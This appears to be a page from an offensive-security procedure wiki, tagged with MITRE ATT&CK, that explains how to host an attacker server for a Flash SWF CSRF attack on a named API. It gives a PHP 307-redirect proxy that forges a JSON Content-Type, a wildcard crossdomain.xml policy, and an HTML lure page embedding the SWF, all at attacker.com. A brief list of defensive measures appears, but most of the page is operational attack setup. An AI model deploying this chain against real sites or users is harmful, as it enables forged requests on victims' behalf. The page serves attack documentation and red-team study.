---
id: p-host-swf-php
tags:
  - hosting
  - php
  - flash
type: procedure
tools:
  - '[[tools/PHP-Redirector]]'
  - '[[tools/crossdomain-xml]]'
  - '[[tools/Flash-SWF-File]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:32:20.812Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Host SWF and PHP Redirector on Attacker Server

## Summary

This procedure sets up an attacker's web server to host the Flash SWF, PHP 307 redirect proxy, and crossdomain.xml policy, enabling the CSRF exploit delivery.

## Description

The server hosts a malicious HTML page embedding the SWF, which posts to the PHP script. The PHP issues a 307 redirect to the Federalist API, forging Content-Type: application/json and evading CORS. crossdomain.xml relaxes Flash security for cross-origin if necessary.

## Requirements

1. Web server (e.g., Apache/Nginx) with PHP support
2. Compiled SWF file from previous procedure
3. Target endpoint URLs and site IDs

## Defense

Defensive measures and detection strategies:

- Block or scan for SWF and suspicious PHP redirects
- Enforce Content-Security-Policy to prevent Flash execution
- Log and alert on 307 redirects with forged headers

## Objectives

1. Deploy all components accessibly
2. Ensure redirect preserves JSON headers
3. Permit Flash cross-origin via policy file

## Instructions

### Step 1: Create PHP Redirector Script

**Context**: Write PHP to handle POST and redirect.

Create proxy.php: <?php header('Location: ' . $_GET['endpoint'], true, 307); header('Content-Type: application/json'); echo $_POST['jsonData']; ?>

**Expected Output**: Script ready at http://attacker.com/proxy.php.

### Step 2: Deploy crossdomain.xml

**Context**: Allow Flash access if cross-origin.

Place crossdomain.xml in server root: <?xml version="1.0"?><cross-domain-policy><allow-access-from domain="*" /></cross-domain-policy>

**Expected Output**: File accessible at http://attacker.com/crossdomain.xml.

### Step 3: Embed SWF in HTML Page

**Context**: Create the lure page.

HTML: <html><body><embed src="swf_json_csrf.swf?jsonData=...&php_url=...&endpoint=..." type="application/x-shockwave-flash"></body></html>

**Expected Output**: Page at http://attacker.com/malicious.html loads SWF.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP-Redirector]]
- [[tools/crossdomain-xml]]

## Tags

- [[hosting]]
- [[php]]
